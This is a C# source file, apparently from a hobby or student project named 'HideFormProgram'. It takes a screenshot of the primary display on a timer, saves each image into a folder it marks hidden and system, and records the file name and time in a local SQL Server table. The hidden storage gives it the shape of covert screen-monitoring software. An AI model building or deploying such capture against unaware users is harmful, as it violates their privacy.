using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Timers;
using System.Windows.Forms;

namespace HideFormProgram
{

    class ScreenShot
    {
        SqlConnection conn = new SqlConnection();
        string connectionString = "Data Source=HAIER-PC;Initial Catalog=myproject;Integrated Security=True";
       public static System.Timers.Timer timer1;

        public ScreenShot()
        {
            conn.ConnectionString = connectionString;
            Int32 interval = getInterval();
            timer1 = new System.Timers.Timer();
            if (interval != 0) { timer1.Interval = interval * 60 * 1000; }
            else
            {                timer1.Interval = 1 * 60 * 1000;               }
            timer1.Elapsed += new ElapsedEventHandler(timer_start);
            timer1.Start();
            Debug.WriteLine("Screen shot started");
        }

        private int getInterval()
        {
            try
            {
                MenuForm form = new MenuForm();
                string text=form.comboBox1.Text;
                Int32 interval = Convert.ToInt32(text);
                return interval;
            }
            catch (Exception ex) { Debug.WriteLine("error in screenshot getInterval\n" + ex);
                return 0;
            }
           
        //            throw new NotImplementedException();
        }

        private void timer_start(object sender, ElapsedEventArgs e)
        {
            capturemyscreen();
            // throw new NotImplementedException();
        }
        public static void screenShotTimerStoper(string test)
        {
            try {
                if (test == "ON")
                {
                    timer1.Start();
                }
                if (test == "OFF")
                    timer1.Stop();
            }
            catch (Exception ex) { Debug.WriteLine("error in screenshot timer stoper\n"+ex); }
        }
        private void capturemyscreen()
        {
            bool check = true;
            string fileName = null;
            try
            {
                fileName = Directory.GetCurrentDirectory();
                fileName = fileName + "\\ABC\\";
                if (Directory.Exists(fileName))
                {
                    Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);
                    Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                    Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                    fileName = fileName + "img_" + DateTime.Now.ToString("yyyyMMdd_hhmmss") + ".jpg";
                    captureBitmap.Save(fileName, ImageFormat.Jpeg);
                    //MessageBox.Show("Screen Captured  " + fileName);

                }
                else
                {
                    DirectoryInfo info = Directory.CreateDirectory(fileName);
                    info.Attributes = FileAttributes.Directory | FileAttributes.Hidden|FileAttributes.System;
                    capturemyscreen();
                }

                //*****************************************************************************************************//
            }
            catch (Exception ex)
            {
                check = false;
                Debug.WriteLine("Error\n" + ex);
            }
            if (check)
            {
                try
                {
                    if (fileName != null)
                    {
                        conn.Open();
                        string query = "insert into ImageBackup(filename,daat,time) values(@fileName,@d,@TIME)";
                        using (SqlCommand cmd = new SqlCommand(query, conn))
                        {
                            cmd.Parameters.AddWithValue("@fileName", fileName);
                            cmd.Parameters.AddWithValue("@d", DateTime.Now.ToString("d"));
                            cmd.Parameters.AddWithValue("@TIME", DateTime.Now.ToString("HH:mm:ss"));
                            int row = cmd.ExecuteNonQuery();
                            if (row == 1)
                                Debug.WriteLine("Insert Successfully");
                            else
                                Debug.WriteLine("Not insert");
                            conn.Close();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Error occure in Database...................\n" + ex);
                    MessageBox.Show("Error\n" + ex);
                }
                //throw new NotImplementedException();
            }
        }
    }
}
